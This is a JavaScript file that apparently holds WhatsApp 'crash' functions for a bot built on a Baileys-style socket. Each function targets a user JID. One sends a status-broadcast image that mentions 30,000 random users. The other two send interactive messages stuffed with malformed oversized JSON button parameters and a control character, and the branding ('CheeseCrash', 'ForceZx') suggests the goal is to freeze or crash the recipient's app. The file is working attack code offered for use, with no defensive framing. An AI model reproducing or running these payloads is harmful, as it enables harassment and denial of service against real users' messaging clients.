async function CheEseXInvis(jid) {
const generateMessage = {
viewOnceMessage: {
message: {
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
caption: "⎋ 𝐂𝐡𝐞𝐞𝐬𝐞𝐂𝐫𝐚𝐬𝐡͜͢-‣",
fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
fileLength: "19769",
height: 354,
width: 783,
mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
mediaKeyTimestamp: "1743225419",
jpegThumbnail: null,
scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
scanLengths: [2437, 17332],
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
isSampled: true,
participant: jid,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true
}
}
}
}
};

const msg = generateWAMessageFromContent(jid, generateMessage, {});

await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [jid],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: jid },
content: undefined
}
]
}
]
}
]
});

if (jid) {
await sock.relayMessage(jid,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐂𝐡𝐞𝐄𝐬𝐞𝐱" },
content: undefined
}
]
}
);
}
}
async function FChyUi(jid) {
let veroForceX = JSON.stringify({
status: true,
criador: "veroForceX",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
const contextInfo = {
mentionedJid: [jid],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: jid
}
};

let messagePayload = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
contextInfo,
body: {
text: "#Vaster Light Team🌚",
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: veroForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",},
{ name: "call_permission_request", buttonParamsJson: veroForceX + "\u0003",},
{ name: "mpm", buttonParamsJson: veroForceX + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",},
]
}
}
}
}
};

await sock.relayMessage(jid, messagePayload, { participant: { jid: jid } });
}

async function Private02(jid) {
let Private02 = JSON.stringify({
status: true,
criador: "hyuiForcex",
resultado: {
type: "md",
ws: {
_events: { "CB:ib,,dirty": ["Array"] },
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: { Object: "authData" },
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: { Object: "transactionOptsData" },
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: { Object: "appStateMacData" },
mobile: true
}
}
}
});
try {
let message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: {
contextInfo: {
mentionedJid: [jid],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: jid,
},
},
body: {
text: "#Vaster Light Team🌚",
},
nativeFlowMessage: {
buttons: [
{
name: "single_select",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "call_permission_request",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
{
name: "mpm",
buttonParamsJson: Private02 + "𝐇𝐲𝐔𝐢 𝐅𝐨𝐫𝐜𝐞𝐙𝐱",
},
],
},
},
},
},
};

await sock.relayMessage(jid, message, {
participant: { jid: jid },
});
} catch (err) {
console.log(err);
}
}